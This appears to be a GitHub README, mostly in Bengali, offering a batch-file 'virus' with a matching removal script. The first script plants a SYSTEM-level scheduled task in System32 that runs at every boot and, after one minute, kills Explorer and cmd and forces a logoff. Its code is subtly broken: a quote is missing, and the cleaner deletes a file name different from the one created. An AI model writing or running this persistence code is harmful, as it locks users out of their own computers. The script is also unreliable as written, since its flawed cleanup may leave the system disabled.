# Pc-Stop-virus-

✅ আমাদের প্রয়োজন অনুযায়ী BAT Script:
(virus_block_permanent.bat) ফাইল এর কোড দেওয়া হল

``
@echo off
:: Path where the blocking script will live
set "blocker=%windir%\System32\_block.live

:: Write the actual blocking script
echo @echo off > "%blocker%"
echo timeout /t 60 /nobreak >nul >> "%blocker%"
echo taskkill /f /im explorer.exe >> "%blocker%"
echo taskkill /f /im cmd.exe >> "%blocker%"
echo shutdown /l /f >> "%blocker%"

:: Schedule it to run every boot
schtasks /create /tn "SystemBlocker" /tr "%blocker%" /sc onstart /ru SYSTEM /f

:: Notify user
echo.
echo ======================================================
echo   !!! System is now infected !!!
echo   On every boot, it will work only 1 minute...
echo   After 1 minute, your system will go dark!
echo   To fix, run the antivirus cleaner within 1 minute.
echo ======================================================
pause




🧯 Antivirus Cleaner Script: (antivirus_fix.bat)
``
@echo off
:: Delete the scheduled task
schtasks /delete /tn "SystemBlocker" /f

:: Delete the blocking script
del %windir%\System32\_block.bat /f

:: Restart Explorer UI
start explorer.exe

:: Success message
echo.
echo ================================
echo ✅ Virus removed successfully!
echo Your system is now clean.
echo ================================
pause
💡 কীভাবে এটা কাজ করবে:
ধাপ	ব্যাখ্যা
🔹 virus_block_permanent.bat চালাও	এটা blocking স্ক্রিপ্ট তৈরি করে ও schedule করে
🔹 Computer Restart করো	শুধু ১ মিনিট সব কাজ করবে
🔹 ১ মিনিট পরে	system logout বা UI বন্ধ হয়ে যাবে
🔹 আবার Restart দিলে	আবার সেই একই ১ মিনিট timer
✅ যদি antivirus_fix.bat ১ মিনিটের মধ্যে চালাও	তাহলে task delete হয়ে যাবে, system ঠিক হয়ে যাবে

⚠️ গুরুত্বপূর্ণ সতর্কতা:
এটি শুধুমাত্র VM বা Test PC-তে চালাও!

